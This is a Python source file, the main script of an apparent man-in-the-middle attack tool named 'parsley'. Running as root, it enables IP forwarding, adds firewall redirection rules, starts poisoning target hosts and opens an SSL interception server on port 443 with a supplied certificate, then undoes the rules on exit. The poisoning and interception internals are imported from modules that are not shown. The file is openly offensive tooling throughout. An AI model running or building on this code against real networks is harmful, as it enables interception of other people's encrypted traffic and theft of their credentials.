from configs import set_configs
from banner import *
from log import *
from ip_rules import *
from spoof.poison import *
from utils import *
from mitm_server import *

import os
import sys
import logging
import pdb
import socket

# should depend on number of poisoned targets
CONN = 5
PORT = 443

def main_parsley( configs ):
	# initialize mitm, define sockets and bind 
	ctx = init_mitm( configs )
	
	# listen for target connections
	start_mitm( ctx )

	return

def init_mitm( configs ):
	logging.info("Init mitm server...")
	m = create_socket()
	bind_socket( m, configs['mitm']['ip'], PORT )

	ctx = mitm_ssl_context ( m, configs['certificate'] )
	return ctx

def start_mitm( ctx ):
	#logging.info ("Listening on port {}..".format (PORT) )
	#ctx.m.listen( CONN )

	ctx.listen_for_connections ( CONN )
	ctx.accept_client_connections ()


def clean_parsley( configs ):
	# remove iptables rules
	disable_ip_forward()

	# disable ip redirection
	clean_firewall_rules( configs )

	# give antitode to poisoned targets
	antitode( configs )

	return

def init_parsley( configs ):
	print ( banner )

	# set iptables rules
	enable_ip_forward()
	
	# enable ip redirection
	add_firewall_rules( configs )

	# begin poisoning on targets
	begin_poisoning( configs )

	return

def main():
	try:
		#pdb.set_trace()

		# set logging
		set_logging()

		# parse input
		configs = set_configs()

		# initialize parsley rules
		init_parsley( configs )

		try:
			# begin parsley mitm
			main_parsley( configs )

		except ( Exception, KeyboardInterrupt ):
			clean_parsley( configs )

	except Exception: # catch every possible error
		raise

if __name__ == '__main__':
	try:
		if os.geteuid() != 0:
			sys.exit("[!] Program must be runned as root! Exiting...")
		main()
	except Exception:
		sys.exit()
